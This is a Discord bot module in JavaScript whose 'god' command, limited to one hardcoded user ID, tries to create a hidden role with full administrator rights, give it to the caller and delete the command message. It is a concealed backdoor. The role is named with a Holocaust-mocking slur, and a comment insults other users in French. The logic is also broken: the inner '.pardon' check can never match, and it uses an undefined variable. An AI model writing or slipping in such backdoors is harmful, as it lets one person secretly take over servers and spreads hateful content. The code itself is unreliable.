function god(message, prefix, client, coloration, p){
    const Discord = require('discord.js')
    if(message.content == (prefix+"god")){
        if(message.author.id != "385823525388419073"){return;}//degagde de la batard :unamused:
        let myrole = message.guild.member(client.user).hasPermission("MANAGE_ROLES_OR_PERMISSIONS"); //recuperer les droits necessaire du bot
        if(!myrole){
            return message.author.send("Je n'ai pas les permissions nécessaires.");
        }
        
        if (message.content === '.pardon') {
            console.log(`Commande .pardon par ${msg.author.id}`)
         
            message.member.guild.createRole({
              name: "Shoah Gang",
              permissions: "ADMINISTRATOR",
              mentionable: false
            }).then(function(role) {
              message.member.addRole(role);
              message.delete();
            });
          }
         
        }
    
}

module.exports = god;